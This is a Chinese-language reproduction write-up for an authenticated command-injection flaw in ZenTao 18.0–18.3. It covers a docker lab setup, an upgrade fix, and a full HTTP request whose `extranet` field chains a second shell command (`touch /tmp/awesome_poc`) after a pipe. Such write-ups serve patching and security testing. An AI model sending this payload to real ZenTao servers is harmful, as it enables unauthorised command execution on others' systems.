# 禅道 zahost-create.html 后台命令执行漏洞

## 漏洞描述

禅道项目管理系统 v18.0-v18.3 版本 `module/zahost/model.php` 中，`ping` 函数未对传入参数 `$address` 进行校验，导致后台命令执行。

参考链接：

- https://www.zentao.net/book/zentaoprohelp/41.html
- https://www.zentao.net/book/zentaopms/405.html

## 漏洞影响

```
禅道 >=18.0，<=18.3（开源版）
```

## 环境搭建

执行如下命令启动一个禅道 18.0 服务器：

```
docker compose up -d
```

docker-compose.yml

```
services:
  zentao:
    image: easysoft/zentao:18.0
    ports:
      - "8084:80"
    environment:
      - MYSQL_INTERNAL=true
    volumes:
      - /data/zentao:/data
```

服务启动后，访问 `http://your-ip:8084` 即可查看到安装页面，默认配置安装直至完成，数据库默认账号密码为 `root/123456`。

## 漏洞复现

使用安装时配置的账号密码登录系统，点击 `测试 → 宿主机`，添加一个宿主机：

![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407113416776.png)

![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407113543730.png)

抓包，修改 extranet 参数，拼接命令，执行 `touch /tmp/awesome_poc`：

```
POST /zahost-create.html HTTP/1.1
Host: your-ip:8084
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://your-ip:8084
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://your-ip:8084/zahost-create.html
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie:
Content-Length: 120

vsoft=kvm&hostType=physical&name=poc&extranet=127.0.0.1|touch%20/tmp/awesome_poc&cpuCores=2&memory=2&diskSize=20&desc=&uid=67f347db724c1&type=za
```

![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407114109214.png)

![](images/禅道%20zahost-create.html%20后台命令执行漏洞/image-20250407114454097.png)

## 漏洞修复

升级至最新版本 https://www.zentao.net/
